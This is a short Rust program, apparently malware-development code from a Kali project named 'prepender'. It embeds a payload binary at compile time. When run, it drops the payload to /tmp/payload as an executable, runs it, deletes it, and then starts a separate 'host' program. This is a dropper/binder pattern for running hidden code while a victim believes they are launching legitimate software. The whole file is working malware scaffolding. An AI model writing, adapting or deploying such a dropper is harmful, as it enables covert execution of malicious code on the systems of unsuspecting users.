use std::io::prelude::*;
use std::fs::OpenOptions;
use std::process::Command;
use std::os::unix::fs::OpenOptionsExt;

fn main() { 
    // Include bytes for the payload at compiletime 
    let bytes = include_bytes!("/home/kali/Projects/prepender/payload");
    
    execute_payload(bytes);
    Command::new("/home/kali/Projects/prepender/host").spawn().unwrap();
}

fn execute_payload(b: &'static [u8]) {
    let mut options = OpenOptions::new();
    
    options.create(true);
    options.write(true);
    options.mode(0o755);

    let mut payload_file = match options.open("/tmp/payload") {
        Ok(v) => v,
        Err(e) => {
            panic!("{:#?}", e);
        },
    };
    payload_file.write_all(b).unwrap();
    payload_file.sync_all().unwrap();
    payload_file.flush().unwrap();
    
    drop(payload_file);
    Command::new("/tmp/payload").spawn().unwrap();
    std::fs::remove_file("/tmp/payload").unwrap();
}
